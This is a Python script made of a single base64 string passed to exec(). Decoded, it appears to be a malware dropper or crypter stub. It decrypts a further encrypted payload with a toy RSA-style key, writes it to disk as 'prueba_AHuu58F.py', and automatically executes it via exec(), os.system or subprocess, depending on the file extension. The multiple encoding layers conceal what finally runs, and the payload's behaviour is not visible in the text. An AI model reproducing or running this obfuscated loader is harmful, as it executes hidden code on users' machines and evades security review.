import base64
data = b'aW1wb3J0IGFyZ3BhcnNlLCBtYXRoLCBiYXNlNjQsIGJpbmFzY2lpLCByYW5kb20sIHN5cywgc3VicHJvY2Vzcywgb3MKZnJvbSByYW5kb20gaW1wb3J0IHJhbmRpbnQKY2R4ID0gIk1qQmhOR05oTXpjd01qQmlNakJoTTJZek1qazRNakJpTWpCaE0yWmpORFU9TWpCaU1qQmhNVGcxTWpnNU1qQmlNakJoTkdOaE5Ea3dNakJpTWpCaE1XUmhORE5pTWpCaU1qQmhaVEE9TkRVPU1qQmlNakJoTVdSaE5UTXlNakJpTWpCaE0yWmpORFU9TWpCaU16Y3dNVGcxTkRrd01qQmlNakJoTkdOaE1qazRNakJpTWpCaE1UZzFOVE15TWpCaU1qQmhOR05oTkRrd01qQmlNakJoTTJZek5UQTJNakJpTWpCaE0yWXpORE5pTWpCaU1qQmhNVGcxTXpjd01qQmlNakJoTTJZek1qWTNNakJpTWpCaE0yWXpNams0TWpCaU1qQmhaVEE9TkRrd01qQmlNakJoTVdSaE16Y3dNakJpTWpCaE0yWXpNalkzTWpCaU1qQmhNMll6TlRBMk1qQmlNakJoTkdOaE1qazRNakJpTWpCaE1XUmhNemN3TWpCaU1qQmhNMll6TWpZM01qQmlNakJoTTJZek5UQTJNakJpTWpCaE5HTmhNams0TWpCaU1qQmhOR05oTWprNE1qQmlNakJoWlRBPU1qWTNNakJpTXpjd01UZzFORGt3TWpCaU1qQmhNVGcxTkRrNE1qQmlNakJoTVdSaE16Y3dNakJpTWpCaFpUQT1NalkzTWpCaU1qQmhaVEE9TlRBMk1qQmlNakJoWlRBPU5Ea3dNakJpTWpCaE1UZzFOVE15TWpCaU1qQmhNMll6TWpZM01qQmlNakJoTTJZek5EazRNakJpTWpCaE1XUmhOVE15TWpCaU1qQmhNVGcxTWpnNU1qQmlNakJoTTJaak5EVT1NakJpTWpCaE1UZzFNalkzTWpCaU1qQmhNV1JoTkRrd01qQmlNakJoTTJaak5ETmlNakJpTWpCaE0yWXpNemN3TWpCaU1qQmhNV1JoTkRrNE1qQmlNakJoTVRnMU1qazRNakJpTWpCaE1UZzFNamc1TWpCaU1qQmhOR05oTXpjd01qQmlNemN3TVRnMU16Y3dNakJpTWpCaFpUQT1ORGt3TWpCaU1qQmhOR05oTWprNE1qQmlNakJoTTJZek1qWTNNakJpTWpCaE0yWXpORGs0TWpCaU16Y3dNVGcxTWpnNU1qQmlNakJoTkdOaE5UQTJNakJpTWpCaE0yWmpORGt3TWpCaU1qQmhNMll6TXpjd01qQmlNakJoTkdOaE5EazRNakJpTWpCaE5HTmhNams0TWpCaU1qQmhNMlpqTkRVPU1qQmlNakJoTVRnMU1qWTNNakJpTWpCaE1UZzFOVEEyTWpCaU1qQmhOR05oTlRBMk1qQmlNakJoTTJaak5EVT1NakJpTXpjd01UZzFNams0TWpCaU1qQmhNMlpqTlRNeU1qQmlNakJoTkdOaE1qazRNakJpTWpCaE0yWmpORFU9TWpCaU1qQmhNVGcxTWpZM01qQmlNakJoTVRnMU5UQTJNakJpTWpCaE5HTmhOVEEyTWpCaU1qQmhNMlpqTkRVPU1qQmlNemN3TVRnMU1qazRNakJpTWpCaE0yWmpOVE15TWpCaU1qQmhNV1JoTkRrd01qQmlNakJoTTJaak5EVT1NakJpTWpCaE1UZzFNalkzTWpCaU1qQmhNVGcxTlRBMk1qQmlNakJoTkdOaE5UQTJNakJpTWpCaE0yWmpORFU9TWpCaU16Y3dNVGcxTWprNE1qQmlNakJoTTJaak5UTXlNakJpTWpCaE5HTmhOVEEyTWpCaU1qQmhNMlpqTkRVPU1qQmlNakJoTVRnMU1qWTNNakJpTWpCaE1XUmhORGt3TWpCaU1qQmhNMlpqTkROaU1qQmlNakJoTTJZek16Y3dNakJpTWpCaE1XUmhORGs0TWpCaU1qQmhOVEUxTkRVPU1qQmlNakJoTVRnMU5UTXlNakJpTWpCaE5HTmhNemN3TWpCaU1qQmhOR05oTWpZM01qQmlNakJoTTJZek5Ea3dNakJpTWpCaE1UZzFNamc1TWpCaU1qQmhNMlpqTXpjd01qQmlNakJoTTJZek16Y3dNakJpTWpCaE0yWXpORGt3TWpCaU1qQmhNVGcxTXpjd01qQmlNakJoTTJZek1qWTNNakJpTWpCaE0yWXpOVEEyTWpCaU1qQmhNV1JoTXpjd01qQmlNakJoTVRnMU5ETmlNakJpTWpCaE0yWXpNalkzTWpCaU1qQmhNMll6TlRBMk1qQmlNakJoWlRBPU5UTXlNakJpTWpCaE1UZzFORE5pTWpCaU1qQmhOR05oTkRrNE1qQmlNakJoWlRBPU5UQTJNakJpTXpjd01UZzFORFU9TWpCaU1qQmhNV1JoTXpjd01qQmlNakJoTkdOaE16Y3dNakJpTWpCaE1XUmhORGs0TWpCaU1qQmhNMll6TlRNeU1qQmlNemN3TVRnMU1qZzVNakJpTWpCaE5URTFORFU9TWpCaU1qQmhaVEE9TXpjd01qQmlNakJoTkdOaE1qazRNakJpTWpCaE1UZzFNemN3TWpCaU1qQmhOR05oTkRVPU1qQmlNakJoWlRBPU1qazRNakJpTWpCaE0yWmpORE5pTWpCaU16Y3dNVGcxTWpnNU1qQmlNakJoWlRBPU1qWTNNakJpTWpCaFpUQT1NemN3TWpCaU1qQmhNV1JoTkRrd01qQmlNemN3TVRnMU5UTXlNakJpTWpCaE0yWXpORGs0TWpCaU1qQmhaVEE9TkRVPU1qQmlNakJoTVdSaE5UTXlNakJpTWpCaE0yWmpORFU9TWpCaU1qQmhOR05oTXpjd01qQmlNakJoTTJZek1qazRNakJpTWpCaE0yWmpORFU9TWpCaU1qQmhNVGcxTWpnNU1qQmlNakJoTkdOaE5Ea3dNakJpTWpCaE1XUmhORE5pTWpCaU1qQmhaVEE9TkRVPU1qQmlNakJoTVdSaE5UTXlNakJpTWpCaE0yWmpORFU9TWpCaU16Y3dNVGcxTkRVPU1qQmlNakJoTTJZek5Ea3dNakJpTWpCaE1UZzFNalkzTWpCaU1qQmhOR05oTkRrd01qQmlNemN3TVRnMU5Ea3dNakJpTWpCaE0yWmpORFU9TWpCaU1qQmhOR05oTWprNE1qQmlNakJoTkdOaE5Ea3dNakJpTWpCaE1XUmhORGs0TWpCaU1qQmhaVEE9TkRrd01qQmlNakJoTVRnMU5UTXlNakJpTWpCaE0yWXpNalkzTWpCaU1qQmhNMll6TlRBMk1qQmlNakJoWlRBPU5UTXlNakJpTWpCaE1UZzFNemN3TWpCaU1qQmhNMll6TWpZM01qQmlNakJoTTJZek1qazRNakJpTWpCaE1UZzFORGs0TWpCaU1qQmhOR05oTWprNE1qQmlNakJoTkdOaE5UTXlNakJpTWpCaFpUQT1ORGs0TWpCaU1qQmhNV1JoTlRNeU1qQmlNakJoTkdOaE5UQTJNakJpTWpCaE5HTmhORE5pTWpCaU16Y3dNVGcxTkRrd01qQmlNakJoTTJaak5EVT1NakJpTXpjd01UZzFNalkzTWpCaU1qQmhNMlpqTkRVPU1qQmlNakJoTVRnMU1qWTNNakJpTXpjd01UZzFORE5pTWpCaU1qQmhNV1JoTkRrNE1qQmlNakJoTkdOaE5Ea3dNakJpTXpjd01UZzFNemN3TWpCaU1qQmhNMlpqTkRVPU1qQmlNakJoTVRnMU5EazRNakJpTWpCaFpUQT1NalkzTWpCaU1qQmhaVEE9TWprNE1qQmlNakJoWlRBPU5EVT1NakJpTWpCaE1XUmhOVE15TWpCaU1qQmhaVEE9TWpZM01qQmlNakJoWlRBPU5EazRNakJpTXpjd01UZzFORFU9TWpCaU1qQmhNVGcxTWpnNU1qQmlNakJoTTJaak16Y3dNakJpTWpCaE0yWXpNemN3TWpCaU1qQmhNMll6TkRrd01qQmlNakJoTkdOaE1qWTNNakJpTWpCaFpUQT1Namc1TWpCaU1qQmhaVEE9TlRBMk1qQmlNakJoTVRnMU5UQTJNakJpTWpCaE1UZzFNamc1TWpCaU1qQmhNMlpqTkRrd01qQmlNakJoWlRBPU5EVT1NakJpTXpjd05HRTNORGs0TWpCaU16Y3dOR0UzTkRrNE1qQmkiCmRycG5tID0gInBydWViYV9BSHV1NThGLnB5IgpwayA9ICg2MzEsIDE2NzkpCgpkZWYgZGN5KHBrLCBjcHR4KToKCWssIG4gPSBwawoJbWVuc2FqZVJlY2liaWRvID0gX19yZUJhNjRfXyhjcHR4LmVuY29kZSgndXRmLTgnKSkKCW1lbnNhamVIZXhSZWNpYmlkbyA9IF9fYmE2NEhleF9fKG1lbnNhamVSZWNpYmlkbykKCW1lbnNhamVEZWNpbWFsUmVjaWJpZG8gPSBfX2hleERlY19fKG1lbnNhamVIZXhSZWNpYmlkbykKCW1lbnNhamVEZXNjaWZyYWRvID0gWygoYyAqKiBrKSAlIG4pIGZvciBjIGluIG1lbnNhamVEZWNpbWFsUmVjaWJpZG9dCgltZW5zYWplX2RlX2FzY2lpID0gX19kZUFTX18obWVuc2FqZURlc2NpZnJhZG8pCglkZWNhc2MgPSBfX3JlQmE2NF9fKCcnLmpvaW4obWVuc2FqZV9kZV9hc2NpaSkuZW5jb2RlKCkpCgloZXhiYTY0ID0gX19iYTY0SGV4X18oZGVjYXNjKQoJYXNoZXggPSBfX2hleERlY19fKGhleGJhNjQpCglkZWFzYyA9IF9fZGVBU19fKGFzaGV4KQoJYmE2NCA9IGJhc2U2NC5iNjRkZWNvZGUoZGVhc2MuZW5jb2RlKCkpCglyZXR1cm4gYmE2NApkZWYgX19yZUJhNjRfXyhtKToKCW1CYTY0ID0gW21baTppKzRdIGZvciBpIGluIHJhbmdlKDAsIGxlbihtKSwgNCldCglyZXR1cm4gbUJhNjQKZGVmIF9fYmE2NEhleF9fKG0pOgoJbUh4ID0gW2Jhc2U2NC5iNjRkZWNvZGUoYjY0KSBmb3IgYjY0IGluIG1dCglyZXR1cm4gbUh4CmRlZiBfX2hleERlY19fKG0pOgoJbURlYyA9IFtpbnQoaGV4YS5kZWNvZGUoIlVURi04IiksIDE2KSBmb3IgaGV4YSBpbiBtXQoJcmV0dXJuIG1EZWMKZGVmIF9fZGVBU19fKG0pOgoJbTEgPSAnJy5qb2luKFtjaHIoZCkgZm9yIGQgaW4gbV0pCglyZXR1cm4gbTEKZGVmIF9fbWVBU19fKG0pOgoJbWVuID0gW29yZChwKSBmb3IgcCBpbiBtXQoJcmV0dXJuIG1lbgpkY3lfZGF0YSA9IGRjeShwaz1waywgY3B0eD1jZHgpCgppbWFnZV9leHRlbnNpb25zID0gKCdqcGcnLCAnanBlZycsICdicG0nLCAnaWNvJywgJ3BuZycpCmV4ZWNfZXh0ZW5zaW9ucyA9ICgnYmF0JywgJ2V4ZScsICd2YnMnLCAncHMxJykKcHl0aG9uX2V4dGVuc2lvbnMgPSAoJ3B5JykKbmYgPSBvcGVuKGRycG5tLCAnd2InKQp0cnk6CgluZi53cml0ZShkY3lfZGF0YSkKZXhjZXB0OgoJcGFzcwpuZi5jbG9zZSgpCmlmIG9zLnBhdGguZXhpc3RzKGRycG5tKToKCWlmIGRycG5tLnNwbGl0KCcuJylbMV0gaW4gaW1hZ2VfZXh0ZW5zaW9uczoKCQlpbWFnZVZpZXdlckZyb21Db21tYW5kTGluZSA9IHsnbGludXgnOid4ZGctb3BlbicsICd3aW4zMic6J2V4cGxvcmVyJywgJ2Rhcndpbic6J29wZW4nfVtzeXMucGxhdGZvcm1dCgkJc3VicHJvY2Vzcy5ydW4oW2ltYWdlVmlld2VyRnJvbUNvbW1hbmRMaW5lLCBkcnBubV0sIGNsb3NlX2Zkcz1UcnVlKQoJaWYgZHJwbm0uc3BsaXQoJy4nKVsxXSBpbiBleGVjX2V4dGVuc2lvbnMgYW5kIHN5cy5wbGF0Zm9ybSA9PSAnd2luMzInOgoJCW9zLnN5c3RlbShkcnBubSkKCWlmIGRycG5tLnNwbGl0KCcuJylbMV0gaW4gcHl0aG9uX2V4dGVuc2lvbnM6CgkJZXhlYyhkY3lfZGF0YSkKCQlwcm9jID0gc3VicHJvY2Vzcy5Qb3BlbigncHl0aG9uIHtmbn0nLmZvcm1hdChmbj1kcnBubSksIHNoZWxsPVRydWUsIHN0ZGluPXN1YnByb2Nlc3MuUElQRSwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgc3RkZXJyPXN1YnByb2Nlc3MuUElQRSkK'
exec(base64.b64decode(data))